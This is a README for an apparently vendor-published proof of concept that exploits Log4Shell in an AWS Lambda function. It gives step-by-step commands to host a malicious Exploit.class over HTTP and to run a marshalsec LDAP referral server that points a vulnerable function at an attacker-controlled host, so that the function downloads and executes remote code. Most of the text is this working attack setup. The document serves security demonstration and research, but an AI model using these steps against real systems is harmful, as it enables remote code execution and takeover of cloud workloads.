# Log4Shell Serverless
Exploit of the log4shell vulnerability in an AWS Lambda function

# How to reproduce the exploit

## Prerequisite

- Vulnerable AWS Lambda Function
- Exploit class
- LDAP Server (controlled by the attacker)

## Quick Steps

- Serve the Exploit class in a publicly accessible location (let's say http://my-log4shell-attack.com/Exploit.class)
- Launch LDAP server configured to redirect to the Exploit class
- Send payload to the vulnerable function

Once the payload reached Log4j, the vulnerable function will download the Exploit.class and run the code it contains

# Vulnerable function

- Create a AWS Lambda function with Java 11 or Java 8 runtime
- Upload the jar artifact (https://github.com/Contrast-Security-Inc/log4shell_serverless/blob/main/vulnerable_lambda/target/blank-java-1.0-SNAPSHOT.jar)
- Configure the handler `example.Handler::handleRequest`

# Exploit Class and LDAP Server

- Launch a server (for instance an EC2)
- Make the server publicly accessible (let's say at IP XXX.XXX.XXX.XXX)
- Run HTTP server to host the Exploit class
- Run the LDAP server

## Running the HTTP Server
```
# git clone git@github.com:Contrast-Security-Inc/log4shell_serverless.git
# cd log4shell_serverless
# python3 -m http.server 8888
```
### Running the LDAP Server
```
# git clone git@github.com:mbechler/marshalsec.git
# git checkout f645788e6a75155fdfccab1fc036a032212d8484
# mvn clean package -DskipTests
# java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://XXX.XXX.XXX.XXX:8888/#Exploit"
```
